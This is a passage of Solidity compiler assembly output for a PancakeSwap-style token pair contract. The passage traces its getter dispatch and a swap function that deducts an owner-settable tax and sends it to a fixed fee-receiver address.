add\n      calldataload\n      tag_69\n      jump\t// in\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_11:\n      tag_65\n      tag_71\n      jump\t// in\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_12:\n      tag_72\n      tag_73\n      jump\t// in\n    tag_72:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_13:\n      tag_65\n      tag_75\n      jump\t// in\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_14:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_77\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_77:\n      pop\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_78\n      jump\t// in\n        /* \"Pair.sol\":934:966  uint public price0CumulativeLast */\n    tag_15:\n      tag_65\n      tag_80\n      jump\t// in\n        /* \"Pair.sol\":972:1004  uint public price1CumulativeLast */\n    tag_16:\n      tag_65\n      tag_82\n      jump\t// in\n        /* \"Pair.sol\":1482:1599  function taxfeeupdate(uint _newtax) public onlyOwner {... */\n    tag_17:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_84\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_84:\n      pop\n        /* \"Pair.sol\":1482:1599  function taxfeeupdate(uint _newtax) public onlyOwner {... */\n      calldataload\n      tag_85\n      jump\t// in\n        /* \"Pair.sol\":5261:6526  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_18:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_87\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_87:\n      pop\n        /* \"Pair.sol\":5261:6526  function mint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_88\n      jump\t// in\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_19:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_90\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_90:\n      pop\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_91\n      jump\t// in\n        /* \"Pair.sol\":1010:1027  uint public kLast */\n    tag_20:\n      tag_65\n      tag_93\n      jump\t// in\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_21:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_95\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_95:\n      pop\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_96\n      jump\t// in\n        /* \"Pair.sol\":8025:9454  function burn(... */\n    tag_22:\n      tag_97\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_98\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_98:\n      pop\n        /* \"Pair.sol\":8025:9454  function burn(... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_99\n      jump\t// in\n    tag_97:\n      0x40\n      dup1\n      mload\n      swap3\n      dup4\n      mstore\n      0x20\n      dup4\n      add\n      swap2\n      swap1\n      swap2\n      mstore\n      dup1\n      mload\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      return\n        /* \"Pair.sol\":1114:1134  address public owner */\n    tag_23:\n      tag_60\n      tag_101\n      jump\t// in\n        /* \"Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n    tag_24:\n      tag_60\n      tag_103\n      jump\t// in\n        /* \"ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_25:\n      tag_49\n      tag_105\n      jump\t// in\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_26:\n      tag_57\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_111\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_111:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_112\n      jump\t// in\n        /* \"Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_27:\n      tag_65\n      tag_114\n      jump\t// in\n        /* \"Pair.sol\":18077:18498  function skim(address to) external lock {... */\n    tag_28:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_116\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_116:\n      pop\n        /* \"Pair.sol\":18077:18498  function skim(address to) external lock {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_117\n      jump\t// in\n        /* \"Pair.sol\":559:581  address public factory */\n    tag_29:\n      tag_60\n      tag_119\n      jump\t// in\n        /* \"Pair.sol\":614:635  address public token1 */\n    tag_30:\n      tag_60\n      tag_121\n      jump\t// in\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n    tag_31:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_123\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_123:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_124\n      jump\t// in\n        /* \"Pair.sol\":6635:7916  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_32:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_126\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_126:\n      pop\n        /* \"Pair.sol\":6635:7916  function Lockmint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_127\n      jump\t// in\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_33:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_129\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_129:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_130\n      jump\t// in\n        /* \"Pair.sol\":641:659  uint public taxfee */\n    tag_34:\n      tag_65\n      tag_132\n      jump\t// in\n        /* \"Pair.sol\":18544:18758  function sync() external lock {... */\n    tag_35:\n      tag_43\n      tag_134\n      jump\t// in\n        /* \"Pair.sol\":11956:14822  function swap(... */\n    tag_48:\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_136\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_136:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      sstore\n        /* \"Pair.sol\":12120:12134  amount0Out > 0 */\n      dup5\n      iszero\n      iszero\n      dup1\n        /* \"Pair.sol\":12120:12152  amount0Out > 0 || amount1Out > 0 */\n      tag_138\n      jumpi\n      pop\n        /* \"Pair.sol\":12151:12152  0 */\n      0x00\n        /* \"Pair.sol\":12138:12148  amount1Out */\n      dup5\n        /* \"Pair.sol\":12138:12152  amount1Out > 0 */\n      gt\n        /* \"Pair.sol\":12120:12152  amount0Out > 0 || amount1Out > 0 */\n    tag_138:\n        /* \"Pair.sol\":12099:12213  require(... */\n      tag_139\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8\n      0x23\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_139:\n        /* \"Pair.sol\":12224:12241  uint112 _reserve0 */\n      0x00\n        /* \"Pair.sol\":12243:12260  uint112 _reserve1 */\n      dup1\n        /* \"Pair.sol\":12266:12279  getReserves() */\n      tag_140\n        /* \"Pair.sol\":12266:12277  getReserves */\n      tag_56\n        /* \"Pair.sol\":12266:12279  getReserves() */\n      jump\t// in\n    tag_140:\n        /* \"Pair.sol\":12223:12279  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      pop\n      swap2\n      pop\n      swap2\n      pop\n        /* \"Pair.sol\":12338:12347  _reserve0 */\n      dup2\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":12325:12347  amount0Out < _reserve0 */\n      and\n        /* \"Pair.sol\":12325:12335  amount0Out */\n      dup8\n        /* \"Pair.sol\":12325:12347  amount0Out < _reserve0 */\n      lt\n        /* \"Pair.sol\":12325:12373  amount0Out < _reserve0 && amount1Out < _reserve1 */\n      dup1\n      iszero\n      tag_141\n      jumpi\n      pop\n        /* \"Pair.sol\":12364:12373  _reserve1 */\n      dup1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":12351:12373  amount1Out < _reserve1 */\n      and\n        /* \"Pair.sol\":12351:12361  amount1Out */\n      dup7\n        /* \"Pair.sol\":12351:12373  amount1Out < _reserve1 */\n      lt\n        /* \"Pair.sol\":12325:12373  amount0Out < _reserve0 && amount1Out < _reserve1 */\n    tag_141:\n        /* \"Pair.sol\":12304:12430  require(... */\n      tag_142\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e53554646494349454e545f4c495155494449545900\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_142:\n        /* \"Pair.sol\":12441:12454  uint balance0 */\n      0x00\n        /* \"Pair.sol\":12464:12477  uint balance1 */\n      dup1\n        /* \"Pair.sol\":12501:12519  uint taxamount0Out */\n      0x00\n        /* \"Pair.sol\":12559:12562  100 */\n      0x64\n        /* \"Pair.sol\":12549:12555  taxfee */\n      sload(0x0a)\n        /* \"Pair.sol\":12536:12546  amount0Out */\n      dup12\n        /* \"Pair.sol\":12536:12555  amount0Out * taxfee */\n      mul\n        /* \"Pair.sol\":12535:12562  (amount0Out * taxfee) / 100 */\n      dup2\n      tag_143\n      jumpi\n      invalid\n    tag_143:\n      div\n        /* \"Pair.sol\":12522:12532  amount0Out */\n      dup11\n        /* \"Pair.sol\":12522:12562  amount0Out - (amount0Out * taxfee) / 100 */\n      sub\n        /* \"Pair.sol\":12501:12562  uint taxamount0Out = amount0Out - (amount0Out * taxfee) / 100 */\n      swap1\n      pop\n        /* \"Pair.sol\":12576:12594  uint taxamount1Out */\n      0x00\n        /* \"Pair.sol\":12634:12637  100 */\n      0x64\n        /* \"Pair.sol\":12624:12630  taxfee */\n      sload(0x0a)\n        /* \"Pair.sol\":12611:12621  amount1Out */\n      dup12\n        /* \"Pair.sol\":12611:12630  amount1Out * taxfee */\n      mul\n        /* \"Pair.sol\":12610:12637  (amount1Out * taxfee) / 100 */\n      dup2\n      tag_144\n      jumpi\n      invalid\n    tag_144:\n        /* \"Pair.sol\":12737:12743  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":12775:12781  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":12610:12637  (amount1Out * taxfee) / 100 */\n      swap3\n      swap1\n      swap2\n      div\n        /* \"Pair.sol\":12597:12637  amount1Out - (amount1Out * taxfee) / 100 */\n      dup13\n      sub\n      swap3\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":12737:12743  token0 */\n      swap1\n      dup2\n      and\n      swap2\n        /* \"Pair.sol\":12775:12781  token1 */\n      dup2\n      and\n      swap1\n        /* \"Pair.sol\":12803:12816  to != _token0 */\n      dup12\n      and\n      dup3\n      eq\n      dup1\n      iszero\n      swap1\n        /* \"Pair.sol\":12803:12833  to != _token0 && to != _token1 */\n      tag_145\n      jumpi\n      pop\n        /* \"Pair.sol\":12826:12833  _token1 */\n      dup1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":12820:12833  to != _token1 */\n      and\n        /* \"Pair.sol\":12820:12822  to */\n      dup12\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":12820:12833  to != _token1 */\n      and\n      eq\n      iszero\n        /* \"Pair.sol\":12803:12833  to != _token0 && to != _token1 */\n    tag_145:\n        /* \"Pair.sol\":12795:12857  require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\") */\n      tag_146\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x13\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x68, 0x50616e63616b653a20494e56414c49445f544f)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_146:\n        /* \"Pair.sol\":12875:12889  amount0Out > 0 */\n      dup13\n      iszero\n        /* \"Pair.sol\":12871:12932  if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out) */\n      tag_148\n      jumpi\n        /* \"Pair.sol\":12891:12932  _safeTransfer(_token0, to, taxamount0Out) */\n      tag_148\n        /* \"Pair.sol\":12905:12912  _token0 */\n      dup3\n        /* \"Pair.sol\":12914:12916  to */\n      dup13\n        /* \"Pair.sol\":12918:12931  taxamount0Out */\n      dup7\n        /* \"Pair.sol\":12891:12904  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":12891:12932  _safeTransfer(_token0, to, taxamount0Out) */\n      jump\t// in\n    tag_148:\n        /* \"Pair.sol\":12984:12998  amount1Out > 0 */\n      dup12\n      iszero\n        /* \"Pair.sol\":12980:13041  if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out) */\n      tag_151\n      jumpi\n        /* \"Pair.sol\":13000:13041  _safeTransfer(_token1, to, taxamount1Out) */\n      tag_151\n        /* \"Pair.sol\":13014:13021  _token1 */\n      dup2\n        /* \"Pair.sol\":13023:13025  to */\n      dup13\n        /* \"Pair.sol\":13027:13040  taxamount1Out */\n      dup6\n        /* \"Pair.sol\":13000:13013  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":13000:13041  _safeTransfer(_token1, to, taxamount1Out) */\n      jump\t// in\n    tag_151:\n        /* \"Pair.sol\":13093:13108  data.length > 0 */\n      dup9\n      iszero\n        /* \"Pair.sol\":13089:13326  if (data.length > 0)... */\n      tag_152\n      jumpi\n        /* \"Pair.sol\":13134:13136  to */\n      dup11\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13126:13149  ICallee(to).pancakeCall */\n      and\n      0x84800812\n        /* \"Pair.sol\":13171:13181  msg.sender */\n      caller\n        /* \"Pair.sol\":13203:13216  taxamount0Out */\n      dup7\n        /* \"Pair.sol\":13253:13266  taxamount1Out */\n      dup7\n        /* \"Pair.sol\":13304:13308  data */\n      dup15\n      dup15\n        /* \"Pair.sol\":13126:13326  ICallee(to).pancakeCall(... */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup7\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup6\n      dup2\n      mstore\n      0x20\n      add\n      dup5\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup5\n      dup5\n      dup3\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n        /* \"--CODEGEN--\":30:33   */\n      dup1\n        /* \"--CODEGEN--\":22:28   */\n      dup3\n        /* \"--CODEGEN--\":14:20   */\n      dup5\n        /* \"--CODEGEN--\":1:34   */\n      calldatacopy\n        /* \"--CODEGEN--\":99:100   */\n      0x00\n        /* \"--CODEGEN--\":93:96   */\n      dup2\n        /* \"--CODEGEN--\":85:91   */\n      dup5\n        /* \"--CODEGEN--\":81:97   */\n      add\n        /* \"--CODEGEN--\":74:101   */\n      mstore\n        /* \"--CODEGEN--\":137:141   */\n      0x1f\n        /* \"--CODEGEN--\":133:142   */\n      not\n        /* \"--CODEGEN--\":126:130   */\n      0x1f\n        /* \"--CODEGEN--\":121:124   */\n      dup3\n        /* \"--CODEGEN--\":117:131   */\n      add\n        /* \"--CODEGEN--\":113:143   */\n      and\n        /* \"--CODEGEN--\":106:143   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":169:172   */\n      dup1\n        /* \"--CODEGEN--\":161:167   */\n      dup4\n        /* \"--CODEGEN--\":157:173   */\n      add\n        /* \"--CODEGEN--\":147:173   */\n      swap3\n      pop\n        /* \"Pair.sol\":13126:13326  ICallee(to).pancakeCall(... */\n      pop\n      pop\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_153\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_153:\n        /* \"Pair.sol\":13126:13326  ICallee(to).pancakeCall(... */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_154\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_154:\n        /* \"Pair.sol\":13126:13326  ICallee(to).pancakeCall(... */\n      pop\n      pop\n      pop\n      pop\n        /* \"Pair.sol\":13089:13326  if (data.length > 0)... */\n    tag_152:\n        /* \"Pair.sol\":13341:13350  uint tax0 */\n      0x00\n        /* \"Pair.sol\":13377:13380  100 */\n      0x64\n        /* \"Pair.sol\":13367:13373  taxfee */\n      sload(0x0a)\n        /* \"Pair.sol\":13354:13364  amount0Out */\n      dup16\n        /* \"Pair.sol\":13354:13373  amount0Out * taxfee */\n      mul\n        /* \"Pair.sol\":13353:13380  (amount0Out * taxfee) / 100 */\n      dup2\n      tag_155\n      jumpi\n      invalid\n    tag_155:\n      div\n        /* \"Pair.sol\":13341:13380  uint tax0 = (amount0Out * taxfee) / 100 */\n      swap1\n      pop\n        /* \"Pair.sol\":13394:13403  uint tax1 */\n      0x00\n        /* \"Pair.sol\":13430:13433  100 */\n      0x64\n        /* \"Pair.sol\":13420:13426  taxfee */\n      sload(0x0a)\n        /* \"Pair.sol\":13407:13417  amount1Out */\n      dup16\n        /* \"Pair.sol\":13407:13426  amount1Out * taxfee */\n      mul\n        /* \"Pair.sol\":13406:13433  (amount1Out * taxfee) / 100 */\n      dup2\n      tag_156\n      jumpi\n      invalid\n    tag_156:\n      div\n      swap1\n      pop\n        /* \"Pair.sol\":13452:13466  amount0Out > 0 */\n      dup15\n      iszero\n        /* \"Pair.sol\":13448:13508  if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_158\n      jumpi\n        /* \"Pair.sol\":13491:13501  FeeResiver */\n      sload(0x06)\n        /* \"Pair.sol\":13468:13508  _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_158\n      swap1\n        /* \"Pair.sol\":13482:13489  _token0 */\n      dup6\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13491:13501  FeeResiver */\n      and\n        /* \"Pair.sol\":13503:13507  tax0 */\n      dup5\n        /* \"Pair.sol\":13468:13481  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":13468:13508  _safeTransfer(_token0, FeeResiver, tax0) */\n      jump\t// in\n    tag_158:\n        /* \"Pair.sol\":13560:13574  amount1Out > 0 */\n      dup14\n      iszero\n        /* \"Pair.sol\":13556:13616  if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_160\n      jumpi\n        /* \"Pair.sol\":13599:13609  FeeResiver */\n      sload(0x06)\n        /* \"Pair.sol\":13576:13616  _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_160\n      swap1\n        /* \"Pair.sol\":13590:13597  _token1 */\n      dup5\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13599:13609  FeeResiver */\n      and\n        /* \"Pair.sol\":13611:13615  tax1 */\n      dup4\n        /* \"Pair.sol\":13576:13589  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":13576:13616  _safeTransfer(_token1, FeeResiver, tax1) */\n      jump\t// in\n    tag_160:\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":13709:13713  this */\n      address\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13675:13700  IERC20(_token0).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":13675:13700  IERC20(_token0).balanceOf */\n      dup7\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_161\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_161:\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_162\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_162:\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      